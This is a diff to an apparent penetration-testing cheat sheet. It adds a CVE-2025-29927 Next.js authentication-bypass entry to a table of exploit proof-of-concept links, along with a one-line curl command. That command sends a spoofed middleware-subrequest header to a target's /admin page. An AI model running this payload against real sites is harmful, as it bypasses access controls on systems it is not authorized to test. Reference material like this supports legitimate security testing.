@@ -436,6 +436,7 @@ Thank you for reading.
 | CVE-2024-49138 | Windows Common Log File System Driver LPE | https://github.com/MrAle98/CVE-2024-49138-POC |
 | CVE-2025-24813 | Apache Tomcat Deserialization RCE (1) | https://github.com/iSee857/CVE-2025-24813-PoC |
 | CVE-2025-24813 | Apache Tomcat Deserialization RCE (2) | https://github.com/absholi7ly/POC-CVE-2025-24813 |
+| CVE-2025-29927 | Next.js Authentication Bypass | https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware |
 | n/a | dompdf RCE (0-day) | https://github.com/positive-security/dompdf-rce |
 | n/a | dompdf XSS to RCE (0-day) | https://positive.security/blog/dompdf-rce |
 | n/a | StorSvc LPE | https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc |
@@ -7591,6 +7592,12 @@ if('1337' in res.text ):
     print('(+) Exploit was successful')
 else:
     print('(!) Exploit may have failed')
+```
+
+#### CVE-2025-29927: Next.js Authentication Bypass
+
+```shell
+$ curl -H "X-Middleware-Subrequest: middleware" https://<RHOST>/admin
 ```
 
 #### GodPotato LPE
